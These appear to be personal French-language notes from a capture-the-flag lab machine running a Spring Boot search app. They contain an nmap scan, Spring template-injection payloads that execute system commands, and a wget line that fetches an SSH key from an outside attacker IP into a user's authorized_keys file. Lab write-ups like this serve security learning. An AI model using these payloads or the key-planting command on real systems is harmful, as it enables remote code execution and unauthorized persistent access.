Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-14 18:09 EDT
Nmap scan report for 10.10.11.170
Host is up (0.024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Red Panda Search | Made with Spring Boot

---

Quand on search mais avec rien:

Greg is a hacker. Watch out for his injection attacks!

---

Technologie utilisee: Spring boot (C'est du java)

Caracteres interdits: ~$_%
Caracteres qui crashent le server: ){}\


Ceci est execute et lance le process 'whoami'
*{T(java.lang.Runtime).getRuntime().exec('whoami')}
Ceci est execute et retourne le output
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}

wget -O /home/woodenk/.ssh/authorized_keys 10.10.14.138:8080/idrsa.pub

utiliser ssti-payload pour generer des requetes qui permettent les underscores

Ajouter notre cle ssh a .ssh/authorized_keys

pspy pour voir les commandes qui sont lancees (peut importe par qui)